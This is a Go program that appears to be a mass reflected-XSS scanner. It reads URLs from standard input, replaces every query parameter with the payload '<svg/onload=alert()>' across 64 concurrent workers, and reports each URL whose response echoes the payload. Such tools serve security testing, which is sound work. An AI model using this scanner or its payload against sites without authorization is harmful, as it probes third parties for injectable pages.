package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
)

func main() {
	inputs := make(chan string)
	var wg sync.WaitGroup
	input := bufio.NewScanner(os.Stdin)
	go func() {
		for input.Scan() {
			inputs <- input.Text()
		}
		close(inputs)
	}()
	for i := 0; i < 64; i++ {
		wg.Add(1)
		go workers(inputs, &wg)
	}
	wg.Wait()
}

func buildurl(s string) {
	ur, err := url.Parse(s)
	checkErr(err)
	x := ur.Query()
	baseurl := ur.Scheme + "://" + ur.Host + ur.Path + "?"
	params := url.Values{}
	for i := range x {
		params.Add(i, "<svg/onload=alert()>")
	}
	finalurl := baseurl + params.Encode()
	if checkxss(finalurl) {
		fmt.Println(s, "is vulnerable to xss")
	}
}

func checkErr(e error) {
	if e != nil {
		fmt.Println(e)
		os.Exit(0)
	}
}

func checkxss(s string) bool {
	resp, err := http.Get(s)
	checkErr(err)
	body, err := ioutil.ReadAll(resp.Body)
	checkErr(err)
	return strings.Contains(string(body), "<svg/onload=alert()>")
}

func workers(cha chan string, wg *sync.WaitGroup) {
	for i := range cha {
		buildurl(i)
	}
	wg.Done()
}
